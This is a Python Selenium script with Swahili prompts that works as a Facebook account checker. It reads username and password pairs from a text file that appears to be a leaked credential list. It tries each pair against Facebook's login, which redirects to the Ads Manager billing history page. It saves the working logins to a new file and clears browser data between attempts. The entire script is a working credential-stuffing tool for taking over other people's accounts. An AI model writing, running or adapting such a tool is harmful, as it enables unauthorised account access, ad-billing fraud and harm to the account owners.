from selenium import webdriver

from selenium.webdriver.common.keys import Keys

from time import sleep

from selenium.common.exceptions import NoSuchElementException

from selenium.webdriver.support import expected_conditions as EC

from selenium.webdriver.support.ui import WebDriverWait

from selenium.webdriver.common.by import By

from selenium.webdriver.chrome.service import Service

s = Service("/Users/SIRvjm/Desktop/chromedriver.exe") #add your platform specific path
driver = webdriver.Chrome(service=s)

file_name = ""


def clear_cache():
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    webdriver.ActionChains(driver).send_keys(Keys.TAB).perform()
    sleep(1)
    webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()




def process_account(username, password):

    url = 'https://www.facebook.com/login.php?next=https%3A%2F%2Fbusiness.facebook.com%2Fads%2Fmanager%2Fbilling_history%2Fsummary%2F'
    #url = 'https://www.facebook.com'

    driver.get(url)

    try:
        try:
            driver.find_element(By.ID, 'email').send_keys(username)
            driver.find_element(By.ID, 'pass').send_keys(password)
            try:
                driver.find_element(By.ID, 'loginbutton').click()
            except:
                driver.find_element(
                    By.XPATH, "//button[@type='submit']").click()
            try:
                driver.find_element(By.ID, "userNavigationLabel")
            except:
                driver.find_element(
                  #  By.XPATH, '/html/body/div[1]/div[1]/div/div/div[1]/div[1]/div/div/div[1]/div/div[2]/div/div/div/div[2]/div[1]/div[2]/div[1]/div[2]')
                  #  By.XPATH, '/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[2]/div/div/div/div[2]/div[1]/div/div/div[1]/div/div/div[1]/div/div')
                  #  By.XPATH, '/html/body/div[1]/div/div[1]/div/div[3]/div/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]')
                    By.XPATH, '/html/body/div[1]/div[1]/div/span/div[1]/div[1]/div/div[2]/div[1]/div[1]/div[2]')

            get_url = (('Username: ')
                       + username + (' Password: ') + password )
            print('\n')
            print("Imekubali By @_sisiskills")
            print('\n')
            global file_name
            print(get_url, file=open(file_name + '.txt', 'a'))
            sleep(5)
            driver.find_element(By.TAG_NAME, 'html').send_keys(Keys.ESCAPE)
            sleep(5)
            driver.find_element(By.ID, "userNavigationLabel").click()
            WebDriverWait(driver, wait).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "a[data-gt*='menu_logout']>span>span._54nh")))
            driver.find_element(
                By.CSS_SELECTOR, "a[data-gt*='menu_logout']>span>span._54nh").click()
        except:
            driver.get('chrome://settings/clearBrowserData')
            sleep(1)
            clear_cache()
    except NoSuchElementException:
        print('incorrect credentials')


wait = 10


def readFile(fileName):
    fileObj = open(fileName, "r")  # opens the file in read mode
    words = set(fileObj.read().splitlines())
    newlist = []
    for i in words:
        newlist.append(i.split(' ')[1] + ' ' + i.split(' ')[-1])
    fileObj.close()
    newArray = []

    for i in newlist:
        if(i.split(' ')[1] != '[PASS]:'):
            newArray.append(i.split(' '))
        else:
            continue

    return newArray


m = readFile(input("Weka Jina la file Account: ") + ".txt")
array_length = len(m)
loop = 0
file_name = input("Weka Jina Account Mpya: ")

while (loop < array_length):
    #print("User Number: " + str(loop) + " -- usernsme: " + m[loop][0])
    try:
        if m[loop][0] != "":
            if m[loop][1] != "":
                print(str(loop) + " / " + str(array_length) + " User Number: "
                      + str(loop) + " -- username: " + m[loop][0] + " -- Password: " + m[loop][1])
                process_account(m[loop][0], m[loop][1])
    except:
        print(str(loop) + " / " + str(array_length) + " xxx User Number: "
              + str(loop) + " -- username: " + m[loop][0] + " -- Password: " + m[loop][1])

    loop = loop + 1

driver.quit()